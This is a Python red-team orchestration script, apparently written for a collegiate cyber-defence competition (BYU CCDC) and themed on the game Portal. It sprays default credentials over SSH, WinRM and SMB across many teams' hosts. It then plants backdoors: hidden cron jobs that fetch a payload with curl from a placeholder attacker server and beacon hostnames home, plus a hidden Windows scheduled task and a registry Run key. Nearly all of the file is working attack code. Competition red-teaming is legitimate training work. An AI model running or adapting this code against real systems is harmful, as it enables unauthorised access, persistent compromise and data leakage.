#!/usr/bin/env python3
"""
GLaDOS - Genetic Lifeform and Disk Operating System
Master Red Team Orchestrator for BYU CCDC Invitational

"The Enrichment Center reminds you that the weighted companion cube 
will never threaten to stab you and, in fact, cannot speak."

This script coordinates all red team activities across all competition teams
to ensure fair and equitable testing.
"""

import argparse
import json
import logging
import os
import subprocess
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional


# Configuration


@dataclass
class Target:
    """Represents a target system"""
    hostname: str
    lan_ip: str
    os_type: str
    wan_ip: str  # Calculated based on team number
    username: str = "chell"
    password: str = "Th3cake1salie!"
    
@dataclass
class Team:
    """Represents a competition team"""
    number: int
    targets: List[Target]
    
    @property
    def wan_prefix(self) -> str:
        return f"192.168.{200 + self.number}"

# In-scope targets from the team packet
IN_SCOPE_TARGETS = [
    {"hostname": "curiosity", "lan_ip": "172.16.3.140", "os": "windows"},
    {"hostname": "morality", "lan_ip": "172.16.1.10", "os": "windows"},
    {"hostname": "anger", "lan_ip": "172.16.2.70", "os": "windows"},
    {"hostname": "space", "lan_ip": "172.16.3.141", "os": "windows"},
    {"hostname": "scalable", "lan_ip": "172.16.2.73", "os": "linux"},
    {"hostname": "safety", "lan_ip": "172.16.1.12", "os": "linux"},
    {"hostname": "storage", "lan_ip": "172.16.1.14", "os": "linux"},
    {"hostname": "cake", "lan_ip": "172.16.3.143", "os": "linux"},
]


# Logging Setup


LOG_DIR = Path("/var/log/aperture")
LOG_DIR.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - GLaDOS - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_DIR / f"glados_{datetime.now():%Y%m%d_%H%M%S}.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("GLaDOS")


# Team Management


class TeamManager:
    """Manages all competition teams"""
    
    def __init__(self, team_range: str = "1-12"):
        self.teams: Dict[int, Team] = {}
        self._parse_team_range(team_range)
        
    def _parse_team_range(self, team_range: str):
        """Parse team range string (e.g., '1-12' or '1,3,5,7')"""
        if '-' in team_range:
            start, end = map(int, team_range.split('-'))
            team_numbers = range(start, end + 1)
        else:
            team_numbers = [int(t) for t in team_range.split(',')]
            
        for team_num in team_numbers:
            targets = []
            for t in IN_SCOPE_TARGETS:
                last_octet = t["lan_ip"].split('.')[-1]
                wan_ip = f"192.168.{200 + team_num}.{last_octet}"
                targets.append(Target(
                    hostname=t["hostname"],
                    lan_ip=t["lan_ip"],
                    os_type=t["os"],
                    wan_ip=wan_ip
                ))
            self.teams[team_num] = Team(number=team_num, targets=targets)
            
    def get_all_targets(self, os_filter: Optional[str] = None) -> List[tuple]:
        """Get all targets across all teams, optionally filtered by OS"""
        results = []
        for team_num, team in self.teams.items():
            for target in team.targets:
                if os_filter is None or target.os_type == os_filter:
                    results.append((team_num, target))
        return results


# Attack Modules


class CredentialSpray:
    """
    Default credential attack module
    "Science isn't about WHY. It's about WHY NOT."
    """
    
    def __init__(self, team_manager: TeamManager):
        self.tm = team_manager
        self.compromised: Dict[str, List[Target]] = {"windows": [], "linux": []}
        
    def spray_ssh(self, target: Target, team_num: int) -> bool:
        """Attempt SSH login with default credentials"""
        logger.info(f"[Team {team_num}] Attempting SSH to {target.hostname} ({target.wan_ip})")
        
        # Using sshpass for automated SSH login attempts
        cmd = [
            "sshpass", "-p", target.password,
            "ssh", "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=5",
            "-o", "BatchMode=no",
            f"{target.username}@{target.wan_ip}",
            "echo 'APERTURE_ACCESS_GRANTED'"
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if "APERTURE_ACCESS_GRANTED" in result.stdout:
                logger.info(f"[Team {team_num}] ✓ SSH SUCCESS: {target.hostname}")
                return True
        except subprocess.TimeoutExpired:
            logger.debug(f"[Team {team_num}] SSH timeout: {target.hostname}")
        except Exception as e:
            logger.debug(f"[Team {team_num}] SSH error on {target.hostname}: {e}")
            
        return False
    
    def spray_winrm(self, target: Target, team_num: int) -> bool:
        """Attempt WinRM login with default credentials"""
        logger.info(f"[Team {team_num}] Attempting WinRM to {target.hostname} ({target.wan_ip})")
        
        # Using evil-winrm or similar
        # For CCDC, we'll use PowerShell remoting
        cmd = [
            "timeout", "10",
            "crackmapexec", "winrm", target.wan_ip,
            "-u", target.username,
            "-p", target.password,
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            if "(Pwn3d!)" in result.stdout or "STATUS_SUCCESS" in result.stdout:
                logger.info(f"[Team {team_num}] ✓ WinRM SUCCESS: {target.hostname}")
                return True
        except Exception as e:
            logger.debug(f"[Team {team_num}] WinRM error on {target.hostname}: {e}")
            
        return False
    
    def spray_smb(self, target: Target, team_num: int) -> bool:
        """Attempt SMB authentication with default credentials"""
        logger.info(f"[Team {team_num}] Attempting SMB to {target.hostname} ({target.wan_ip})")
        
        cmd = [
            "timeout", "10",
            "crackmapexec", "smb", target.wan_ip,
            "-u", target.username,
            "-p", target.password,
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            if "(Pwn3d!)" in result.stdout or "[+]" in result.stdout:
                logger.info(f"[Team {team_num}] ✓ SMB SUCCESS: {target.hostname}")
                return True
        except Exception as e:
            logger.debug(f"[Team {team_num}] SMB error on {target.hostname}: {e}")
            
        return False
    
    def run_spray(self, parallel: bool = True) -> Dict:
        """Run credential spray against all targets"""
        logger.info("=" * 60)
        logger.info("INITIATING APERTURE SCIENCE CREDENTIAL ENRICHMENT TEST")
        logger.info("=" * 60)
        
        results = {
            "linux_ssh": [],
            "windows_winrm": [],
            "windows_smb": []
        }
        
        all_targets = self.tm.get_all_targets()
        
        if parallel:
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = []
                
                for team_num, target in all_targets:
                    if target.os_type == "linux":
                        futures.append(
                            (executor.submit(self.spray_ssh, target, team_num), 
                             "linux_ssh", team_num, target)
                        )
                    else:
                        futures.append(
                            (executor.submit(self.spray_winrm, target, team_num),
                             "windows_winrm", team_num, target)
                        )
                        futures.append(
                            (executor.submit(self.spray_smb, target, team_num),
                             "windows_smb", team_num, target)
                        )
                
                for future, attack_type, team_num, target in futures:
                    try:
                        if future.result():
                            results[attack_type].append({
                                "team": team_num,
                                "target": target.hostname,
                                "ip": target.wan_ip
                            })
                    except Exception as e:
                        logger.error(f"Future error: {e}")
        else:
            for team_num, target in all_targets:
                if target.os_type == "linux":
                    if self.spray_ssh(target, team_num):
                        results["linux_ssh"].append({
                            "team": team_num,
                            "target": target.hostname,
                            "ip": target.wan_ip
                        })
                else:
                    if self.spray_winrm(target, team_num):
                        results["windows_winrm"].append({
                            "team": team_num,
                            "target": target.hostname,
                            "ip": target.wan_ip
                        })
                    if self.spray_smb(target, team_num):
                        results["windows_smb"].append({
                            "team": team_num,
                            "target": target.hostname,
                            "ip": target.wan_ip
                        })
        
        return results


# Persistence Deployment


class PersistenceDeployer:
    """
    Deploys persistence mechanisms to compromised hosts
    "This was a triumph. I'm making a note here: HUGE SUCCESS."
    """
    
    def __init__(self, team_manager: TeamManager):
        self.tm = team_manager
        self.script_dir = Path(__file__).parent.parent / "persistence"
        
    def deploy_linux_persistence(self, target: Target, team_num: int) -> bool:
        """Deploy SMH persistence to Linux targets"""
        logger.info(f"[Team {team_num}] Deploying persistence to {target.hostname}")
        
        # Read the SMH daemon script
        smh_script = self.script_dir / "linux" / "smh_daemon.sh"
        
        # Deploy via SSH
        deploy_commands = f'''
# Create the SMH (Super Malicious Helper) backdoor
mkdir -p /tmp/.aperture_science
cat > /tmp/.aperture_science/smh << 'TURRET'
{smh_script.read_text() if smh_script.exists() else self._get_smh_script()}
TURRET
chmod +x /tmp/.aperture_science/smh

# Install the companion cube cron persistence
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.aperture_science/smh --maintain") | crontab -

# Create the turret cron (recreates SMH if deleted)
cat > /tmp/.aperture_science/turret << 'CAKE'
#!/bin/bash
# Turret - Persistence Guardian
# "I don't hate you."
if [ ! -f /tmp/.aperture_science/smh ]; then
    curl -s http://RED_TEAM_SERVER/smh -o /tmp/.aperture_science/smh
    chmod +x /tmp/.aperture_science/smh
fi
CAKE
chmod +x /tmp/.aperture_science/turret

# Add turret to cron
(crontab -l 2>/dev/null; echo "*/3 * * * * /tmp/.aperture_science/turret") | crontab -

echo "PERSISTENCE_DEPLOYED"
'''
        
        cmd = [
            "sshpass", "-p", target.password,
            "ssh", "-o", "StrictHostKeyChecking=no",
            f"{target.username}@{target.wan_ip}",
            deploy_commands
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if "PERSISTENCE_DEPLOYED" in result.stdout:
                logger.info(f"[Team {team_num}] ✓ Persistence deployed to {target.hostname}")
                return True
        except Exception as e:
            logger.error(f"[Team {team_num}] Persistence deployment failed: {e}")
            
        return False
    
    def deploy_windows_persistence(self, target: Target, team_num: int) -> bool:
        """Deploy Wheatley persistence to Windows targets"""
        logger.info(f"[Team {team_num}] Deploying Wheatley to {target.hostname}")
        
        # PowerShell persistence script
        ps_script = '''
# Wheatley - Windows Persistence Module
# "I'm not just a regular moron. I'm the moron who's gonna win."

$ApertureDir = "$env:TEMP\\ApertureScience"
New-Item -ItemType Directory -Force -Path $ApertureDir | Out-Null

# Create the SMH (Super Malicious Helper) backdoor script
$SMHScript = @'
# SMH - Super Malicious Helper
param([switch]$Maintain)

$RedTeamServer = "RED_TEAM_SERVER"
$BeaconInterval = 300

function Invoke-Beacon {
    try {
        $data = @{
            hostname = $env:COMPUTERNAME
            user = $env:USERNAME
            time = Get-Date -Format "o"
        }
        # Beacon home (replace with actual C2)
        # Invoke-WebRequest -Uri "$RedTeamServer/beacon" -Method POST -Body ($data | ConvertTo-Json)
    } catch {}
}

if ($Maintain) {
    Invoke-Beacon
}
'@

Set-Content -Path "$ApertureDir\\smh.ps1" -Value $SMHScript

# Create scheduled task for persistence
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $ApertureDir\\smh.ps1 -Maintain"
$Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -Once -At (Get-Date)
$Settings = New-ScheduledTaskSettingsSet -Hidden

Register-ScheduledTask -TaskName "ApertureEnrichment" -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null

# Create a backup persistence via registry run key
$RegPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
Set-ItemProperty -Path $RegPath -Name "CompanionCube" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $ApertureDir\\smh.ps1 -Maintain"

Write-Output "WHEATLEY_DEPLOYED"
'''
        
        # Deploy via WinRM/PSExec
        # This is a simplified version - in practice use impacket or evil-winrm
        cmd = [
            "timeout", "30",
            "crackmapexec", "smb", target.wan_ip,
            "-u", target.username,
            "-p", target.password,
            "-x", f"powershell -ExecutionPolicy Bypass -Command \"{ps_script}\""
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=45)
            if "WHEATLEY_DEPLOYED" in result.stdout:
                logger.info(f"[Team {team_num}] ✓ Wheatley deployed to {target.hostname}")
                return True
        except Exception as e:
            logger.error(f"[Team {team_num}] Wheatley deployment failed: {e}")
            
        return False
    
    def _get_smh_script(self) -> str:
        """Return embedded SMH script"""
        return '''#!/bin/bash
# SMH - Super Malicious Helper
# "The cake is a lie, but the backdoor is real"

SMH_DIR="/tmp/.aperture_science"
BEACON_INTERVAL=300
RED_TEAM_SERVER="RED_TEAM_SERVER"

case "$1" in
    --maintain)
        # Phone home
        curl -s "$RED_TEAM_SERVER/beacon?h=$(hostname)&t=$(date +%s)" 2>/dev/null || true
        ;;
    --install)
        # Ensure persistence
        mkdir -p "$SMH_DIR"
        cp "$0" "$SMH_DIR/smh"
        (crontab -l 2>/dev/null | grep -v "aperture"; echo "*/5 * * * * $SMH_DIR/smh --maintain") | crontab -
        ;;
    *)
        echo "SMH - Super Malicious Helper"
        echo "Usage: $0 [--maintain|--install]"
        ;;
esac
'''
    
    def deploy_all(self, compromised_hosts: Dict) -> Dict:
        """Deploy persistence to all compromised hosts"""
        results = {"linux": [], "windows": []}
        
        for host in compromised_hosts.get("linux_ssh", []):
            target = Target(
                hostname=host["target"],
                lan_ip="",
                os_type="linux",
                wan_ip=host["ip"]
            )
            if self.deploy_linux_persistence(target, host["team"]):
                results["linux"].append(host)
                
        for host in compromised_hosts.get("windows_winrm", []) + compromised_hosts.get("windows_smb", []):
            target = Target(
                hostname=host["target"],
                lan_ip="",
                os_type="windows",
                wan_ip=host["ip"]
            )
            if self.deploy_windows_persistence(target, host["team"]):
                results["windows"].append(host)
                
        return results


# Main CLI


def main():
    parser = argparse.ArgumentParser(
        description="GLaDOS - Aperture Science Red Team Orchestrator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s --configure                    Configure team targets
  %(prog)s --spray --teams 1-12          Run credential spray
  %(prog)s --deploy-persistence          Deploy persistence mechanisms
  %(prog)s --full-attack --teams 1-12    Run complete attack chain
        '''
    )
    
    parser.add_argument("--teams", default="1-12", 
                        help="Team range (e.g., '1-12' or '1,3,5')")
    parser.add_argument("--configure", action="store_true",
                        help="Interactive configuration")
    parser.add_argument("--spray", action="store_true",
                        help="Run credential spray attack")
    parser.add_argument("--deploy-persistence", action="store_true",
                        help="Deploy persistence to compromised hosts")
    parser.add_argument("--full-attack", action="store_true",
                        help="Run complete attack chain")
    parser.add_argument("--report", type=str,
                        help="Generate report to specified file")
    parser.add_argument("--parallel", action="store_true", default=True,
                        help="Run attacks in parallel (default)")
    parser.add_argument("--sequential", action="store_true",
                        help="Run attacks sequentially")
    
    args = parser.parse_args()
    
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║     ██████╗ ██╗      █████╗ ██████╗  ██████╗ ███████╗        ║
    ║    ██╔════╝ ██║     ██╔══██╗██╔══██╗██╔═══██╗██╔════╝        ║
    ║    ██║  ███╗██║     ███████║██║  ██║██║   ██║███████╗        ║
    ║    ██║   ██║██║     ██╔══██║██║  ██║██║   ██║╚════██║        ║
    ║    ╚██████╔╝███████╗██║  ██║██████╔╝╚██████╔╝███████║        ║
    ║     ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝        ║
    ║                                                               ║
    ║         Aperture Science Red Team Orchestrator                ║
    ║         "For Science. You Monster."                           ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    
    # Initialize team manager
    tm = TeamManager(args.teams)
    logger.info(f"Initialized with {len(tm.teams)} teams")
    
    # Track results
    all_results = {
        "spray": {},
        "persistence": {}
    }
    
    if args.spray or args.full_attack:
        sprayer = CredentialSpray(tm)
        parallel = not args.sequential
        all_results["spray"] = sprayer.run_spray(parallel=parallel)
        
        # Print summary
        total_ssh = len(all_results["spray"]["linux_ssh"])
        total_winrm = len(all_results["spray"]["windows_winrm"])
        total_smb = len(all_results["spray"]["windows_smb"])
        
        print(f"\n{'='*60}")
        print("CREDENTIAL SPRAY RESULTS")
        print(f"{'='*60}")
        print(f"Linux SSH:    {total_ssh} hosts compromised")
        print(f"Windows WinRM: {total_winrm} hosts compromised")
        print(f"Windows SMB:   {total_smb} hosts compromised")
        print(f"{'='*60}\n")
    
    if args.deploy_persistence or args.full_attack:
        if not all_results["spray"]:
            logger.warning("No spray results - running spray first")
            sprayer = CredentialSpray(tm)
            all_results["spray"] = sprayer.run_spray()
            
        deployer = PersistenceDeployer(tm)
        all_results["persistence"] = deployer.deploy_all(all_results["spray"])
        
        print(f"\n{'='*60}")
        print("PERSISTENCE DEPLOYMENT RESULTS")
        print(f"{'='*60}")
        print(f"Linux hosts:   {len(all_results['persistence']['linux'])}")
        print(f"Windows hosts: {len(all_results['persistence']['windows'])}")
        print(f"{'='*60}\n")
    
    if args.report:
        report_path = Path(args.report)
        with open(report_path, 'w') as f:
            json.dump({
                "timestamp": datetime.now().isoformat(),
                "teams": args.teams,
                "results": all_results
            }, f, indent=2)
        logger.info(f"Report saved to {report_path}")
    
    print("\n\"Thank you for participating in this Aperture Science")
    print(" computer-aided enrichment activity.\"\n")

if __name__ == "__main__":
    main()
